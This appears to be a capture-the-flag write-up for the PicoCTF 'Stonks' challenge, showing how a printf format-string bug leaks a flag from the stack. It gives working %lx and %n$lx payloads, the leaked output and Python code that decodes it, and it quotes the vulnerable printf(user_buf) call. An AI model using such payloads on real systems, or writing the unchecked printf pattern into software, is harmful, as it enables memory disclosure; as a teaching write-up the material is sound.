---
layout: post
tags:
  - sjqr:ua
  - writeup
  - picoctf
  - binary-exploitation
---

# PicoCTF: Stonks

[Original challenge *(requires login)*](https://play.picoctf.org/practice/challenge/105)

## Finding the vulnerability

I knew going into this that the vulnerability would be a `printf` format string-related one, which is pretty familiar territory for me.
When I set up my environment for the challenge, this was confirmed:

```
; gcc -Wall -Wextra vuln.c -o vuln.exe
stonks/vuln.c: In function ‘buy_stonks’:
stonks/vuln.c:93:2: warning: format not a string literal and no format arguments [-Wformat-security]
   93 |  printf(user_buf);
      |  ^~~~~~
# (omitted some unused variable warnings)
```

Just goes to show: Always compile with warnings.
It could have saved this dev from making this mistake.

It also saved *me* from having to dig for the vulnerable line, since it's... right there.
A very quick check shows that it's user input from when you're prompted to enter your API token:

```c
char *user_buf = malloc(300 + 1);
printf("What is your API token?\n");
scanf("%300s", user_buf);
printf("Buying stonks with token:\n");
printf(user_buf);
```

The way this vulnerability is gonna work is pretty simple:
Because they called `printf` with *our input* as the format string, we can slide some `%lx`s in there.
Arguments to variadic functions like `printf` are passed on the stack, so any format specifiers we put in there will read data off the stack, and conveniently, that's where the flag is sitting:

```c
// FLAG_BUFFER == 128
char api_buf[FLAG_BUFFER];
FILE *f = fopen("api","r");
if (!f) {
  printf("Flag file not found. Contact an admin.\n");
  exit(1);
}
fgets(api_buf, FLAG_BUFFER, f);
```

So it's just a matter of finding the right offset to start at, dumping enough to cover the length of the flag, and then parsing it.
Finding the offset is a bit tedious, but by putting a [de Bruijn](https://en.wikipedia.org/wiki/De_Bruijn_sequence) sequence in the flag file, it's pretty simple:

```py3
from pwn import *
cyclic_gen(string.digits).get(128)
# => '00001000200030004000500060007000800090011001200130014001500160017001800190021002200230024002500260027002800290031003200330034003'
```

Notice I picked `string.digits`: I'm gonna be looking at hex, and the byte value for each digit is just `0x30` plus that digit, which makes it easier to read.

## Testing and building

So now we build a format string.
I'm going to be using `%lx`, printing out `long`s as hex, and I'm gonna use 20, separated by `.`.
You could also do 20 `%016lx`; I just prefer the dots because I find it easier to reason about endianness if I can clearly see the chunks delimited.
Note the `l` in both, though: On my system, all arguments are treated as at least 8 bytes wide, and `%x` only prints out the last 4 of those bytes.
That's part of why I picked a de Bruijn sequence; it's long enough to fill up a lot of space while still being pretty easy to tell if anything is missing.

When we pass in the format string, we get out:

```
What is your API token?
%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx
Buying stonks with token:
7fe6f1a9b723.0.7fe6f19c01e7.1a.7fffffff.7ffcf52f0a40.556f3c9ac2a0.200000000.556f3c9ac6d0.556f3c9ad9e0.556f3c9ada00.3030303130303030.3030303330303032.3030303530303034.3030303730303036.3130303930303038.3130303231303031.3130303431303033.3130303631303035.3130303831303037
```

And we see, starting at 'argument' 12, our de Bruijn sequence: `3030303130303030` is `00010000`, which is the first eight bytes backwards.

## Cleaning it up

Now that we have our offsets, we can use a less brute-force approach and target the exact indices we actually want:

```py3
# flag is max. 128 bytes long, %lx prints 8 bytes per format specifier
'.'.join(f'%{i}$lx' for i in range(12, 12 + (128//8)))
# => %12$lx.%13$lx.%14$lx.%15$lx.%16$lx.%17$lx.%18$lx.%19$lx
```

The `%n$` syntax is a non-standard extension, but the server supports it, so it's fair game.
It lets us get an argument by index, rather than having to go through all of the arguments before it, and it makes parsing the output just a little easier.
It's not necessary, though, if your target doesn't support it.

```
What is your API token?
%12$lx.%13$lx.%14$lx.%15$lx.%16$lx.%17$lx.%18$lx.%19$lx
Buying stonks with token:
3030303130303030.3030303330303032.3030303530303034.3030303730303036.3130303930303038.3130303231303031.3130303431303033.3130303631303035
```

This output is pretty simple to parse:

```py3
resp = # ...
chunks = resp.split(b'.')
nums = (int(c, 16) for c in chunks)
byteses = (i.to_bytes(8, 'little') for i in nums)
flag_bytes = b''.join(byteses)[:MAX_FLAG]
flag = flag_bytes.decode('utf-8')
```

In order, that:

- Splits our period-separated chunks into just the chunks
- Parses each as an integer
- Converts that integer to little-endian bytes (this may need to be tweaked to work when running locally)
- Joins all the chunks of bytes together
- Converts that to text

Which gets us our flag!
It could also have been a "one-liner", but I chose to break it into small steps to make it easier to see, step by step, what was going on.

My [actual solution](./solve.py) has some extra bits to be self-contained; as long as you have a C compiler on your system accessible as `cc` -- which, after installing any C compiler on a Linux system, you should -- it'll compile `vuln.c`, copy your flag file next to it, and run it, all on its own.
It also of course includes the machinery to dump the stack on its own.
It *also* includes some extra machinery to handle the differences between my local machine and the server, trim the flag at the first null, etc.
But the bulk of the work, the actual reverse-engineering and exploitation, is what I've described in this post.
